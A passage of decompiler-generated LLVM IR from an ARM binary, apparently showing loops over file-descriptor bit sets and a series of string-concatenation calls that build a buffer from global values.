  store i32 %v2_865c, i32* %r3.global-to-local, align 4
  %v0_8660 = load i32, i32* @r6, align 4
  %v1_8660 = add i32 %v0_8660, -1452
  %v2_8660 = inttoptr i32 %v1_8660 to i32*
  %v3_8660 = load i32, i32* %v2_8660, align 4
  store i32 %v3_8660, i32* @r0, align 4
  %v0_8664 = load i32, i32* @r5, align 4
  store i32 %v0_8664, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-44, align 4
  store i32 8, i32* @r2, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_8674, i32* %r3.global-to-local, align 4
  %v5_867c = call i32 @function_14ae4(i32 %v3_8660, i32 %v0_8664, i32 8, i32 %v2_8674, i32 4)
  store i32 %v5_867c, i32* %r0.global-to-local, align 4
  %v0_8680 = load i32, i32* @r6, align 4
  %v1_8680 = add i32 %v0_8680, -1436
  %v2_8680 = inttoptr i32 %v1_8680 to i32*
  %v3_8680 = load i32, i32* %v2_8680, align 4
  store i32 %v3_8680, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 %v2_865c, i32* %r2.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %v3_828c, i32* %r0.global-to-local, align 4
  %v1_869c = call i32 @function_1484c(i32 %v3_828c)
  store i32 %v1_869c, i32* %r0.global-to-local, align 4
  store i32 %v2_865c, i32* %r3.global-to-local, align 4
  %v0_86a8 = load i32, i32* @r4, align 4
  %v1_86a8 = trunc i32 %v0_86a8 to i8
  %v2_86a8 = load i32, i32* @r6, align 4
  %v3_86a8 = add i32 %v2_86a8, -1448
  %v4_86a8 = inttoptr i32 %v3_86a8 to i8*
  store i8 %v1_86a8, i8* %v4_86a8, align 1
  store i32 %v2_84f8, i32* %ip.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v1_86b8 = load i32, i32* @r6, align 4
  %v2_86b8 = add i32 %v1_86b8, -1444
  %v3_86b8 = inttoptr i32 %v2_86b8 to i32*
  store i32 %v2_84f8, i32* %v3_86b8, align 4
  store i32 %v2_86bc, i32* %r1.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r6, align 4
  %v1_86c0 = add i32 %v0_86c0, -1452
  %v2_86c0 = inttoptr i32 %v1_86c0 to i32*
  %v3_86c0 = load i32, i32* %v2_86c0, align 4
  store i32 %v3_86c0, i32* %r0.global-to-local, align 4
  %v3_86c4 = call i32 @function_14798(i32 %v3_86c0, i32 %v2_86bc, i32 16)
  store i32 %v3_86c4, i32* %r0.global-to-local, align 4
  %v0_86c8 = load i32, i32* @r6, align 4
  %v1_86c8 = add i32 %v0_86c8, -1452
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  %v3_86c8 = load i32, i32* %v2_86c8, align 4
  store i32 %v3_86c8, i32* %ip.global-to-local, align 4
  %v3_86d0 = udiv i32 %v3_86c8, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_86d4 = mul nuw nsw i32 %v3_86d0, 4
  store i32 %v3_86d4, i32* %r2.global-to-local, align 4
  store i32 %v2_86d8, i32* @lr, align 4
  br label %dec_label_pc_86e0

dec_label_pc_86e0:                                ; preds = %dec_label_pc_8cc8, %dec_label_pc_8634
  %v0_86f0 = phi i32 [ %v3_86c8, %dec_label_pc_8634 ], [ %v3_8cc8, %dec_label_pc_8cc8 ]
  %v3_86d4.pn = phi i32 [ %v3_86d4, %dec_label_pc_8634 ], [ %v3_8cd4, %dec_label_pc_8cc8 ]
  %storemerge = add i32 %v3_86d4.pn, %v2_86d8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_86e0 = add i32 %storemerge, -292
  %v2_86e0 = inttoptr i32 %v1_86e0 to i32*
  %v3_86e0 = load i32, i32* %v2_86e0, align 4
  %v1_86e4 = urem i32 %v0_86f0, 32
  store i32 %v1_86e4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_86ec = shl i32 1, %v1_86e4
  %v8_86ec = or i32 %v3_86e0, %v7_86ec
  store i32 %v8_86ec, i32* %r1.global-to-local, align 4
  %v1_86f0 = load i32, i32* @r8, align 4
  %v2_86f0 = sub i32 %v0_86f0, %v1_86f0
  %v3_86f0 = icmp uge i32 %v0_86f0, %v1_86f0
  store i1 %v3_86f0, i1* %cpsr_c.global-to-local, align 1
  %v4_86f0 = xor i32 %v1_86f0, %v0_86f0
  %v5_86f0 = xor i32 %v2_86f0, %v0_86f0
  %v6_86f0 = and i32 %v5_86f0, %v4_86f0
  %v7_86f0 = icmp slt i32 %v6_86f0, 0
  %v8_86f0 = icmp slt i32 %v2_86f0, 0
  %v9_86f0 = icmp eq i32 %v0_86f0, %v1_86f0
  store i1 %v9_86f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_86ec, i32* %v2_86e0, align 4
  %v3_86f8 = xor i1 %v8_86f0, %v7_86f0
  %v4_86f8 = or i1 %v9_86f0, %v3_86f8
  br i1 %v4_86f8, label %dec_label_pc_85bc, label %dec_label_pc_86fc

dec_label_pc_86fc:                                ; preds = %dec_label_pc_86e0
  %v0_86fc = load i32, i32* %ip.global-to-local, align 4
  %v1_86fc = load i32, i32* %r3.global-to-local, align 4
  %v2_86fc = add i32 %v1_86fc, %v0_86fc
  store i32 %v2_86fc, i32* @r8, align 4
  br label %dec_label_pc_8700

dec_label_pc_8700:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_900c, %dec_label_pc_8fb8, %dec_label_pc_86fc
  %v0_871860 = phi i32 [ %v2_8d80, %dec_label_pc_8d80 ], [ %v2_900c, %dec_label_pc_900c ], [ %v2_8fb8, %dec_label_pc_8fb8 ], [ %v2_86fc, %dec_label_pc_86fc ]
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_8704 = load i32, i32* @r7, align 4
  %v1_8704 = add i32 %v0_8704, 1
  store i32 %v1_8704, i32* @r7, align 4
  %v0_8708 = load i32, i32* @r6, align 4
  %v3_870c = icmp uge i32 %v1_8704, %v0_839c
  store i1 %v3_870c, i1* %cpsr_c.global-to-local, align 1
  %v9_870c = icmp eq i32 %v1_8704, %v0_839c
  store i1 %v9_870c, i1* %cpsr_z.global-to-local, align 1
  %v1_8710 = add i32 %v0_8708, 3140
  store i32 %v1_8710, i32* @r6, align 4
  br i1 %v9_870c, label %dec_label_pc_8718, label %dec_label_pc_85d4

dec_label_pc_8718:                                ; preds = %dec_label_pc_8700, %dec_label_pc_85bc.dec_label_pc_8718_crit_edge
  %v0_8750 = phi i32 [ %v0_8718.pre, %dec_label_pc_85bc.dec_label_pc_8718_crit_edge ], [ %v0_871860, %dec_label_pc_8700 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8718 = icmp eq i32 %v0_8750, 0
  store i1 %v2_8718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8718, label %dec_label_pc_84f4, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_8718
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8740, i32* %ip.global-to-local, align 4
  store i32 %v2_8744, i32* %r1.global-to-local, align 4
  store i32 %v2_8748, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8750, i32* %r0.global-to-local, align 4
  %v5_8758 = call i32 @function_14cd8(i32 %v0_8750, i32 %v2_8744, i32 %v2_8748, i32 0, i32 %v2_8740)
  store i32 %v5_8758, i32* @r4, align 4
  %v0_8760 = load i32, i32* @r5, align 4
  store i32 %v0_8760, i32* %r0.global-to-local, align 4
  %v1_8764 = inttoptr i32 %v0_8760 to i32*
  %v2_8764 = call i32 @function_15ad0(i32* %v1_8764)
  store i32 %v2_8764, i32* %r0.global-to-local, align 4
  %v0_8768 = load i32, i32* @r4, align 4
  %v1_8768 = load i32, i32* @r5, align 4
  %v3_8768 = icmp uge i32 %v0_8768, %v1_8768
  store i1 %v3_8768, i1* %cpsr_c.global-to-local, align 1
  %v9_8768 = icmp eq i32 %v0_8768, %v1_8768
  store i1 %v9_8768, i1* %cpsr_z.global-to-local, align 1
  %v7_8770 = icmp sgt i32 %v0_8768, %v1_8768
  br i1 %v7_8770, label %dec_label_pc_8774, label %dec_label_pc_84f4

dec_label_pc_8774:                                ; preds = %dec_label_pc_8720
  %v0_87d4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_87d4

dec_label_pc_877c:                                ; preds = %dec_label_pc_87e8, %dec_label_pc_8854
  %v1_878c = phi i32 [ %v1_8800, %dec_label_pc_87e8 ], [ %v1_878c.pre, %dec_label_pc_8854 ]
  %v0_8784 = phi i32 [ %v3_87f0, %dec_label_pc_87e8 ], [ %v0_8784.pre, %dec_label_pc_8854 ]
  store i32 %v2_86d8, i32* %r3.global-to-local, align 4
  %v2_8784 = add i32 %v0_8784, %v2_86d8
  store i32 %v2_8784, i32* %r2.global-to-local, align 4
  %v1_8788 = add i32 %v2_8784, -164
  %v2_8788 = inttoptr i32 %v1_8788 to i32*
  %v3_8788 = load i32, i32* %v2_8788, align 4
  %v2_878c = add i32 %v1_878c, -1
  %v3_878c = shl i32 1, %v2_878c
  %v4_878c = and i32 %v3_8788, %v3_878c
  %v5_878c = icmp ne i32 %v4_878c, 0
  store i1 %v5_878c, i1* %cpsr_c.global-to-local, align 1
  %v6_878c = lshr i32 %v3_8788, %v1_878c
  store i32 %v6_878c, i32* %r3.global-to-local, align 4
  %v1_8790 = urem i32 %v6_878c, 2
  %v2_8790 = icmp eq i32 %v1_8790, 0
  store i1 %v2_8790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8790, label %dec_label_pc_87b4, label %dec_label_pc_8798

dec_label_pc_8798:                                ; preds = %dec_label_pc_877c
  %v0_8798 = load i32, i32* @sl, align 4
  %v1_8798 = add i32 %v0_8798, -1448
  %v2_8798 = inttoptr i32 %v1_8798 to i8*
  %v3_8798 = load i8, i8* %v2_8798, align 1
  %v4_8798 = zext i8 %v3_8798 to i32
  store i32 %v4_8798, i32* %r3.global-to-local, align 4
  %v2_879c = icmp ugt i8 %v3_8798, 5
  store i1 %v2_879c, i1* %cpsr_c.global-to-local, align 1
  %v7_879c = icmp eq i8 %v3_8798, 6
  store i1 %v7_879c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_879c, label %dec_label_pc_9054, label %dec_label_pc_87a4

dec_label_pc_87a4:                                ; preds = %dec_label_pc_8798
  %v2_87a4 = icmp ugt i8 %v3_8798, 6
  store i1 %v2_87a4, i1* %cpsr_c.global-to-local, align 1
  %v7_87a4 = icmp eq i8 %v3_8798, 7
  store i1 %v7_87a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87a4, label %dec_label_pc_8d88, label %dec_label_pc_87ac

dec_label_pc_87ac:                                ; preds = %dec_label_pc_87a4
  %v2_87ac = icmp ugt i8 %v3_8798, 9
  store i1 %v2_87ac, i1* %cpsr_c.global-to-local, align 1
  %v7_87ac = icmp eq i8 %v3_8798, 10
  store i1 %v7_87ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87ac, label %dec_label_pc_8ce4, label %dec_label_pc_87b4

dec_label_pc_87b4:                                ; preds = %dec_label_pc_8e84, %dec_label_pc_95ac, %dec_label_pc_959c, %dec_label_pc_8d34, %dec_label_pc_87ac, %dec_label_pc_877c, %dec_label_pc_87d4, %dec_label_pc_90a4, %dec_label_pc_9b54, %dec_label_pc_9a00, %dec_label_pc_9978, %dec_label_pc_991c, %dec_label_pc_9704, %dec_label_pc_95bc, %dec_label_pc_8d40, %dec_label_pc_8fc0
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_87bc = add i32 %stack_var_-20824.0, 1
  store i32 %v1_87bc, i32* %r2.global-to-local, align 4
  %v0_87c0 = load i32, i32* @sl, align 4
  %v3_87c4 = icmp uge i32 %v1_87bc, %v0_839c
  store i1 %v3_87c4, i1* %cpsr_c.global-to-local, align 1
  %v9_87c4 = icmp eq i32 %v1_87bc, %v0_839c
  store i1 %v9_87c4, i1* %cpsr_z.global-to-local, align 1
  %v1_87cc = add i32 %v0_87c0, 3140
  store i32 %v1_87cc, i32* @sl, align 4
  br i1 %v9_87c4, label %dec_label_pc_84f4, label %dec_label_pc_87d4

dec_label_pc_87d4:                                ; preds = %dec_label_pc_87b4, %dec_label_pc_8774
  %stack_var_-20824.0 = phi i32 [ %v1_8768, %dec_label_pc_8774 ], [ %v1_87bc, %dec_label_pc_87b4 ]
  %v0_87d4 = phi i32 [ %v0_87d4.pre, %dec_label_pc_8774 ], [ %v1_87cc, %dec_label_pc_87b4 ]
  %v1_87d4 = add i32 %v0_87d4, -1452
  %v2_87d4 = inttoptr i32 %v1_87d4 to i32*
  %v3_87d4 = load i32, i32* %v2_87d4, align 4
  store i32 %v3_87d4, i32* %r0.global-to-local, align 4
  %v2_87dc = icmp eq i32 %v3_87d4, -1
  store i1 %v2_87dc, i1* %cpsr_c.global-to-local, align 1
  %v7_87dc = icmp eq i32 %v3_87d4, -1
  store i1 %v7_87dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_87d4, i32* @sb, align 4
  br i1 %v7_87dc, label %dec_label_pc_87b4, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87d4
  %v3_87e8 = udiv i32 %v3_87d4, 32
  %v3_87f0 = mul nuw nsw i32 %v3_87e8, 4
  store i32 %v3_87f0, i32* %ip.global-to-local, align 4
  store i32 %v2_86d8, i32* @lr, align 4
  %v2_87f8 = add i32 %v3_87f0, %v2_86d8
  store i32 %v2_87f8, i32* %r2.global-to-local, align 4
  %v1_87fc = add i32 %v2_87f8, -292
  %v2_87fc = inttoptr i32 %v1_87fc to i32*
  %v3_87fc = load i32, i32* %v2_87fc, align 4
  %v1_8800 = urem i32 %v3_87d4, 32
  store i32 %v1_8800, i32* %r1.global-to-local, align 4
  %v2_8804 = add nsw i32 %v1_8800, -1
  %v3_8804 = shl i32 1, %v2_8804
  %v4_8804 = and i32 %v3_87fc, %v3_8804
  %v5_8804 = icmp ne i32 %v4_8804, 0
  store i1 %v5_8804, i1* %cpsr_c.global-to-local, align 1
  %v6_8804 = lshr i32 %v3_87fc, %v1_8800
  store i32 %v6_8804, i32* %r3.global-to-local, align 4
  %v1_8808 = urem i32 %v6_8804, 2
  %v2_8808 = icmp eq i32 %v1_8808, 0
  store i1 %v2_8808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8808, label %dec_label_pc_877c, label %dec_label_pc_8810

dec_label_pc_8810:                                ; preds = %dec_label_pc_87e8
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8828, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_8834, i32* @lr, align 4
  store i32 4, i32* @r2, align 4
  %v5_8840 = call i32 @function_14804(i32 %v3_87d4, i32 1, i32 4, i32 %v2_8828, i32 %v2_8834)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8848 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8848, i32* %r3.global-to-local, align 4
  %v2_884c = or i32 %v3_8848, %v5_8840
  store i32 %v2_884c, i32* %r0.global-to-local, align 4
  %v4_884c = icmp eq i32 %v2_884c, 0
  store i1 %v4_884c, i1* %cpsr_z.global-to-local, align 1
  %v0_8854 = load i32, i32* @sl, align 4
  %v1_8854 = add i32 %v0_8854, -1452
  %v2_8854 = inttoptr i32 %v1_8854 to i32*
  %v3_8854 = load i32, i32* %v2_8854, align 4
  br i1 %v4_884c, label %dec_label_pc_8854, label %dec_label_pc_8fc0

dec_label_pc_8854:                                ; preds = %dec_label_pc_8810
  store i32 %v3_8854, i32* %r3.global-to-local, align 4
  %v3_8858 = udiv i32 %v3_8854, 32
  store i32 %v3_8858, i32* %r2.global-to-local, align 4
  %v1_885c = urem i32 %v3_8854, 32
  store i32 %v1_885c, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8860 = mul nuw nsw i32 %v3_8858, 4
  store i32 %v3_8860, i32* %ip.global-to-local, align 4
  %v0_8864 = load i32, i32* @r4, align 4
  %v1_8864 = trunc i32 %v0_8864 to i8
  %v3_8864 = add i32 %v0_8854, -1448
  %v4_8864 = inttoptr i32 %v3_8864 to i8*
  store i8 %v1_8864, i8* %v4_8864, align 1
  %v0_8784.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_878c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_877c

dec_label_pc_886c:                                ; preds = %dec_label_pc_85d4
  %v1_886c = add i32 %v3_8878, 4
  %v2_886c = inttoptr i32 %v1_886c to i32*
  %v3_886c = load i32, i32* %v2_886c, align 4
  store i32 %v3_886c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8870 = icmp eq i32 %v3_886c, 0
  store i1 %v2_8870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8870, label %.thread18, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_886c
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_85d4, align 1
  %v0_887c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_887c.pr.pr, label %.thread16..thread18_crit_edge, label %dec_label_pc_8884

.thread16..thread18_crit_edge:                    ; preds = %.thread16
  %v1_887c.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_887c.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_887c.pre to i8
  br label %.thread18

.thread18:                                        ; preds = %.thread16..thread18_crit_edge, %dec_label_pc_886c
  %v3_887c = phi i32 [ %v3_887c.pre, %.thread16..thread18_crit_edge ], [ %v3_8878, %dec_label_pc_886c ]
  %v1_887c.off0 = phi i8 [ %extract.t, %.thread16..thread18_crit_edge ], [ 0, %dec_label_pc_886c ]
  %v4_887c = add i32 %v3_887c, -1448
  %v5_887c = inttoptr i32 %v4_887c to i8*
  store i8 %v1_887c.off0, i8* %v5_887c, align 1
  %v0_8880.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8880.pr, label %.thread18.dec_label_pc_85f0_crit_edge, label %dec_label_pc_8884

.thread18.dec_label_pc_85f0_crit_edge:            ; preds = %.thread18
  %v0_85f0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_85f0

dec_label_pc_8884:                                ; preds = %.thread16, %.thread18, %dec_label_pc_857c
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_888c = load i32, i32* @r5, align 4
  %v1_888c = add i32 %v0_888c, 2112
  store i32 %v1_888c, i32* %r0.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = add i32 %v1_8890, 12
  %v3_8890 = inttoptr i32 %v2_8890 to i32*
  store i32 -1, i32* %v3_8890, align 4
  %v0_8894 = load i32, i32* %r0.global-to-local, align 4
  %v1_8894 = add i32 %v0_8894, 4
  store i32 %v1_8894, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_889c = load i32, i32* @sb, align 4
  %v1_889c = load i32, i32* @r6, align 4
  %v2_889c = inttoptr i32 %v1_889c to i32*
  store i32 %v0_889c, i32* %v2_889c, align 4
  %v2_88a0 = call i32 @function_123b8(i32 %v1_8894, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_88ac = load i32, i32* @sb, align 4
  %v1_88ac = load i32, i32* @r6, align 4
  %v2_88ac = add i32 %v1_88ac, 660
  %v3_88ac = inttoptr i32 %v2_88ac to i32*
  store i32 %v0_88ac, i32* %v3_88ac, align 4
  %v2_88b0 = call i32 @function_123b8(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88b8 = call i32 @function_12324(i8* %v1_88b8)
  %v0_88bc = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_88c4 = add i32 %v0_88bc, 1431
  store i32 %v1_88c4, i32* @fp, align 4
  %v2_88c8 = add i32 %v2_88b8, %stack_var_-20860.0.ph
  store i32 %v2_88c8, i32* @r0, align 4
  store i32 %v1_88c4, i32* %r1.global-to-local, align 4
  %v2_88d0 = inttoptr i32 %v2_88c8 to i8*
  %v3_88d0 = call i32 @function_1234c(i8* %v2_88d0, i32 %v1_88c4)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88d8 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_19778.26 to i32), i32* %r1.global-to-local, align 4
  %v2_88e4 = add i32 %v2_88d8, %stack_var_-20860.0.ph
  store i32 %v2_88e4, i32* @r0, align 4
  %v2_88e8 = inttoptr i32 %v2_88e4 to i8*
  %v3_88e8 = call i32 @function_1234c(i8* %v2_88e8, i32 ptrtoint (i32* @global_var_19778.26 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88f0 = call i32 @function_12324(i8* %v1_88b8)
  %v2_88f8 = add i32 %v2_88f0, %stack_var_-20860.0.ph
  store i32 %v2_88f8, i32* @r0, align 4
  %v0_88fc = load i32, i32* @r5, align 4
  %v1_88fc = add i32 %v0_88fc, 532
  store i32 %v1_88fc, i32* %r1.global-to-local, align 4
  %v2_8900 = inttoptr i32 %v2_88f8 to i8*
  %v3_8900 = call i32 @function_1234c(i8* %v2_8900, i32 %v1_88fc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8908 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_19750.28 to i32), i32* %r1.global-to-local, align 4
  %v2_8914 = add i32 %v2_8908, %stack_var_-20860.0.ph
  store i32 %v2_8914, i32* @r0, align 4
  %v3_8918 = inttoptr i32 %v2_8914 to i8*
  %v4_8918 = call i32 @function_1234c(i8* %v3_8918, i32 ptrtoint ([24 x i8]* @global_var_19750.28 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8920 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_8928 = load i32, i32* @r5, align 4
  %v1_8928 = add i32 %v0_8928, 20
  store i32 %v1_8928, i32* %r1.global-to-local, align 4
  %v2_892c = add i32 %v2_8920, %stack_var_-20860.0.ph
  store i32 %v2_892c, i32* @r0, align 4
  %v2_8930 = inttoptr i32 %v2_892c to i8*
  %v3_8930 = call i32 @function_1234c(i8* %v2_8930, i32 %v1_8928)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8938 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19768.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8944 = add i32 %v2_8938, %stack_var_-20860.0.ph
  store i32 %v2_8944, i32* @r0, align 4
  %v3_8948 = inttoptr i32 %v2_8944 to i8*
  %v4_8948 = call i32 @function_1234c(i8* %v3_8948, i32 ptrtoint ([9 x i8]* @global_var_19768.30 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8950 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_8958 = load i32, i32* @r5, align 4
  %v2_895c = add i32 %v2_8950, %stack_var_-20860.0.ph
  store i32 %v2_895c, i32* @r0, align 4
  %v1_8960 = add i32 %v0_8958, 789
  store i32 %v1_8960, i32* %r1.global-to-local, align 4
  %v2_8964 = inttoptr i32 %v2_895c to i8*
  %v3_8964 = call i32 @function_1234c(i8* %v2_8964, i32 %v1_8960)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_896c = call i32 @function_12324(i8* %v1_88b8)
  %v2_8974 = add i32 %v2_896c, %stack_var_-20860.0.ph
  store i32 %v2_8974, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r1.global-to-local, align 4
  %v3_897c = inttoptr i32 %v2_8974 to i8*
  %v4_897c = call i32 @function_1234c(i8* %v3_897c, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_8984 = call i32 @function_11a94(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_898c = call i32 @function_12324(i8* %v1_88b8)
  %v0_8990 = load i32, i32* @sb, align 4
  store i32 %v0_8990, i32* %r1.global-to-local, align 4
  store i32 %v2_898c, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_899c = inttoptr i32 %v0_8990 to i32*
  %v3_899c = call i32 @function_119d0(i32 32, i32* %v2_899c)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_899c, i32* %r1.global-to-local, align 4
  %v1_89a8 = load i32, i32* @r4, align 4
  %v2_89a8 = add i32 %v1_89a8, %stack_var_-20860.0.ph
  store i32 %v2_89a8, i32* @r0, align 4
  %v2_89ac = inttoptr i32 %v2_89a8 to i8*
  %v3_89ac = call i32 @function_1234c(i8* %v2_89ac, i32 %v3_899c)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_89b4 = call i32 @function_119f4(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89bc = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r1.global-to-local, align 4
  %v2_89c8 = add i32 %v2_89bc, %stack_var_-20860.0.ph
  store i32 %v2_89c8, i32* @r0, align 4
  %v3_89cc = inttoptr i32 %v2_89c8 to i8*
  %v4_89cc = call i32 @function_1234c(i8* %v3_89cc, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_89d4 = call i32 @function_11a94(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89dc = call i32 @function_12324(i8* %v1_88b8)
  %v0_89e0 = load i32, i32* @sb, align 4
  store i32 %v0_89e0, i32* %r1.global-to-local, align 4
  store i32 %v2_89dc, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_89ec = inttoptr i32 %v0_89e0 to i32*
  %v3_89ec = call i32 @function_119d0(i32 33, i32* %v2_89ec)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_89ec, i32* %r1.global-to-local, align 4
  %v1_89f8 = load i32, i32* @r4, align 4
  %v2_89f8 = add i32 %v1_89f8, %stack_var_-20860.0.ph
  store i32 %v2_89f8, i32* @r0, align 4
  %v2_89fc = inttoptr i32 %v2_89f8 to i8*
  %v3_89fc = call i32 @function_1234c(i8* %v2_89fc, i32 %v3_89ec)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a04 = call i32 @function_119f4(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a0c = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8a18 = add i32 %v2_8a0c, %stack_var_-20860.0.ph
  store i32 %v2_8a18, i32* @r0, align 4
  %v3_8a1c = inttoptr i32 %v2_8a18 to i8*
  %v4_8a1c = call i32 @function_1234c(i8* %v3_8a1c, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a24 = call i32 @function_11a94(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a2c = call i32 @function_12324(i8* %v1_88b8)
  %v0_8a30 = load i32, i32* @sb, align 4
  store i32 %v0_8a30, i32* %r1.global-to-local, align 4
  store i32 %v2_8a2c, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_8a3c = inttoptr i32 %v0_8a30 to i32*
  %v3_8a3c = call i32 @function_119d0(i32 34, i32* %v2_8a3c)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a3c, i32* %r1.global-to-local, align 4
  %v1_8a48 = load i32, i32* @r4, align 4
  %v2_8a48 = add i32 %v1_8a48, %stack_var_-20860.0.ph
  store i32 %v2_8a48, i32* @r0, align 4
  %v2_8a4c = inttoptr i32 %v2_8a48 to i8*
  %v3_8a4c = call i32 @function_1234c(i8* %v2_8a4c, i32 %v3_8a3c)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a54 = call i32 @function_119f4(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a5c = call i32 @function_12324(i8* %v1_88b8)
